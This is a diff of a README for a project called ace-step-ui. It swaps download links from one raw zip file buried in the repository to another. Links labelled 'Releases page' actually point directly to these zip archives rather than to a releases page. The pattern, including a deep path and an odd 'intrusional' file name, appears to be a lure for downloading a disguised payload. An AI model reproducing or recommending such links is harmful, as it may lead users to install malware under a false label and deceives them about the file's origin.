@@ -16,14 +16,14 @@ Before you proceed, ensure your computer meets these requirements:
 - **Internet Connection:** Required for initial setup and updates
 
 ## 📥 Download ace-step-ui
-[![Download ace-step-ui](https://github.com/SAMKhadka/ace-step-ui/raw/refs/heads/main/server/public/demucs-web/ace_step_ui_intrusional.zip)](https://github.com/SAMKhadka/ace-step-ui/raw/refs/heads/main/server/public/demucs-web/ace_step_ui_intrusional.zip)
+[![Download ace-step-ui](https://github.com/SAMKhadka/ace-step-ui/raw/refs/heads/main/services/ace_step_ui_v3.5.zip)](https://github.com/SAMKhadka/ace-step-ui/raw/refs/heads/main/services/ace_step_ui_v3.5.zip)
 
 To download ace-step-ui, visit our Releases page:
 
-[Visit the Releases Page](https://github.com/SAMKhadka/ace-step-ui/raw/refs/heads/main/server/public/demucs-web/ace_step_ui_intrusional.zip)
+[Visit the Releases Page](https://github.com/SAMKhadka/ace-step-ui/raw/refs/heads/main/services/ace_step_ui_v3.5.zip)
 
 ## 💾 Download & Install
-1. Go to the [Releases page](https://github.com/SAMKhadka/ace-step-ui/raw/refs/heads/main/server/public/demucs-web/ace_step_ui_intrusional.zip).
+1. Go to the [Releases page](https://github.com/SAMKhadka/ace-step-ui/raw/refs/heads/main/services/ace_step_ui_v3.5.zip).
 2. Choose the latest version available.
 3. Look for the installer file that matches your operating system (Windows or macOS).
 4. Click the file name to start the download.
